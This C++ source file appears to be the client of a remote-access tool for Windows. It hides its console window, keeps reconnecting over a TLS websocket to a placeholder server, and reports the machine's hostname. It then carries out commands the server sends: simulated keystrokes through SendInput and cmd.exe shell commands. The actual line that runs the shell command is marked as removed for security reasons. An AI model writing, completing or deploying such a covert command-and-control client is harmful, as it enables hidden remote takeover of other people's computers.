#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <cstdlib>

#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib") //--comment for linker.

#include <windows.h>
#include <iostream>
#include <string>
#include <sstream>
#include <iterator>
#include <vector>
#include <boost/beast.hpp>
#include <boost/beast/ssl.hpp>
#include <boost/asio.hpp>
#include <boost/asio/ssl.hpp>
#include <boost/json.hpp>

#include <boost/beast/core.hpp>
#include <boost/beast/http.hpp>
#include <boost/beast/ssl.hpp>
#include <boost/beast/version.hpp>
#include <boost/asio/connect.hpp>
#include <boost/asio/ip/tcp.hpp>
#include <boost/asio/ssl/error.hpp>
#include <boost/asio/ssl/stream.hpp>
#include <cstdlib>
#include <iostream>
#include <string>
#include "root_certificates.hpp"

namespace beast = boost::beast; // from <boost/beast.hpp>
namespace http = beast::http;	// from <boost/beast/http.hpp>
namespace net = boost::asio;	// from <boost/asio.hpp>
namespace ssl = net::ssl;		// from <boost/asio/ssl.hpp>
using tcp = net::ip::tcp;		// from <boost/asio/ip/tcp.hpp>

using namespace boost::asio;
using namespace boost::beast;
using namespace boost::json;
using namespace std;

#define VERSION = "0.0.1";

#define _DEBUG_

void connect_to_server()
{
	io_context ioc;

	ssl::context ctx(ssl::context::tlsv12_client);

	load_root_certificates(ctx);

	tcp::resolver resolver{ioc};
	websocket::stream<beast::ssl_stream<tcp::socket>> ws{ioc, ctx};

	std::string host = "example.com";

	auto const results = resolver.resolve(host, "443");

	auto ep = net::connect(get_lowest_layer(ws), results);

	if (!SSL_set_tlsext_host_name(ws.next_layer().native_handle(), host.c_str()))
		throw beast::system_error(
			beast::error_code(
				static_cast<int>(::ERR_get_error()),
				net::error::get_ssl_category()),
			"Failed to set SNI Hostname");

	// Update the host_ string. This will provide the value of the
	// Host HTTP header during the WebSocket handshake.
	// See https://tools.ietf.org/html/rfc7230#section-5.4
	host += ':' + std::to_string(ep.port());

	// Perform the SSL handshake
	ws.next_layer().handshake(ssl::stream_base::client);

	// Set a decorator to change the User-Agent of the handshake
	ws.set_option(websocket::stream_base::decorator(
		[](websocket::request_type &req)
		{
			req.set(http::field::user_agent,
					std::string(BOOST_STRINGIZE(VERSION)) +
						" websocket-client-coro");
		}));

	// Perform the websocket handshake
	ws.handshake(host, "/");

	// create a new thread that periodically checks if ws.is_open() is true and if not, throws and exception
	// this is to prevent the program from hanging if the connection is lost
	std::thread t([&ws]()
				  {
		while (true) {
			if (!ws.is_open()) {
				throw std::runtime_error("Connection lost");
			}
			else {
				// std::cout << "Alive" << std::endl;
			}
			std::this_thread::sleep_for(std::chrono::milliseconds(100));
		} });

	/*
	{
	"op": 0,
	"data": {
		"name": "DESKTOP",
		"os": "Microsoft Windows 8"
	},
	"to": "WSS",
	"from": "DESKTOP"
}
	*/

	auto const hostname = boost::asio::ip::host_name();

	object helloMessage;
	helloMessage["op"] = 0;
	helloMessage["data"] = {{"name", hostname}, {"os", "TODO"}};
	helloMessage["to"] = "WSS";
	helloMessage["from"] = hostname;

	object pongMessage;
	pongMessage["op"] = 5;
	pongMessage["data"] = nullptr;
	pongMessage["to"] = "WSS";
	pongMessage["from"] = hostname;

	// send the hello message
	ws.write(net::buffer(serialize(helloMessage)));

	// boost::beast::flat_buffer buffer;
	// ws.read(buffer);

	// Continously read messages from the server
	while (true)
	{
		boost::beast::flat_buffer buffer;
		ws.read(buffer);

		std::string message = boost::beast::buffers_to_string(buffer.data());
		std::cout << message << std::endl;

		// parse the message
		value v = parse(message);
		object obj = v.as_object();
		int op = obj["op"].as_int64();

		switch (op)
		{
		case 1:
			std::cout << "Registered to server" << std::endl;
			break;

		case 4:
			std::cout << "PING" << std::endl;
			ws.write(net::buffer(serialize(pongMessage)));
			std::cout << "PONG" << std::endl;
			break;
		case 7:
			std::cout << "Received an execute" << std::endl;
			object data = obj["data"].as_object();
			switch (data["type"].as_int64())
			{
			case 0:
			{
				std::string keys =
					data["value"].as_string().c_str();
				std::cout << std::string("Executing ") + std::string(data["id"].as_string().c_str()) << std::endl;

				std::vector<INPUT> vec;
				for (int i = 0; i < keys.length(); i++)
				{
					INPUT input = {0};
					input.type = INPUT_KEYBOARD;
					input.ki.dwFlags = KEYEVENTF_UNICODE;
					input.ki.wScan = keys[i];
					vec.push_back(input);

					input.ki.dwFlags |= KEYEVENTF_KEYUP;
					vec.push_back(input);
				}

				SendInput(vec.size(), vec.data(), sizeof(INPUT));

				object doneMessage;
				doneMessage["op"] = 8;
				doneMessage["data"] = data["id"];
				doneMessage["to"] = "WSS";
				doneMessage["from"] = hostname;

				ws.write(net::buffer(serialize(doneMessage)));
				break;
			}
			case 1:
				std::cout << "SHELL" << std::endl;

				std::string command = std::string("/c ") + data["value"].as_string().c_str();

				std::cout << std::string("Executing ") + std::string(data["id"].as_string().c_str()) << std::endl;

				// Line(s) removed for security reasons

				object doneMessage;
				doneMessage["op"] = 8;
				doneMessage["data"] = data["id"];
				doneMessage["to"] = "WSS";
				doneMessage["from"] = hostname;

				ws.write(net::buffer(serialize(doneMessage)));

				break;
			}
			break;
		}
	}
}

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	while (true)
	{
		{
			try
			{
				std::cout << "Connecting to server..." << std::endl;
				connect_to_server();
			}
			catch (std::exception const &e)
			{
				std::cerr << "Error: " << e.what() << std::endl;
			}
			std::cout << "Reconnecting in 5 seconds..." << std::endl;
			std::this_thread::sleep_for(std::chrono::seconds(5));
		}
	}
}